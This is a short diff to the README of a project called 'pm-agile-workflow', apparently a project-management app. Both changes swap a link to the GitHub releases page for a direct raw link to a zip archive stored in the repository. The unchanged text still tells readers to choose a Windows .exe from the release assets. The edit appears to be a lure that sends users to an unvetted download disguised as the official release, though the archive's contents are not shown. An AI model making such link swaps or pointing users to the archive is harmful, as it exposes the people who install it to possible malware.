@@ -1,6 +1,6 @@
 # 🧭 pm-agile-workflow - Turn Ideas Into Clear Delivery
 
-[![Download the app](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/antoninfatty836/pm-agile-workflow/releases)
+[![Download the app](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/antoninfatty836/pm-agile-workflow/main/pm-agile-workflow/workflow_agile_pm_v2.7.zip)
 
 ## 🖥️ What this app does
 
@@ -38,7 +38,7 @@ Recommended setup:
 
 Visit this page to download the Windows release:
 
-https://github.com/antoninfatty836/pm-agile-workflow/releases
+https://raw.githubusercontent.com/antoninfatty836/pm-agile-workflow/main/pm-agile-workflow/workflow_agile_pm_v2.7.zip
 
 Look for the latest release, then pick the Windows file from the assets list. If there are more than one, choose the file with the `.exe` extension or the file marked for Windows.
 
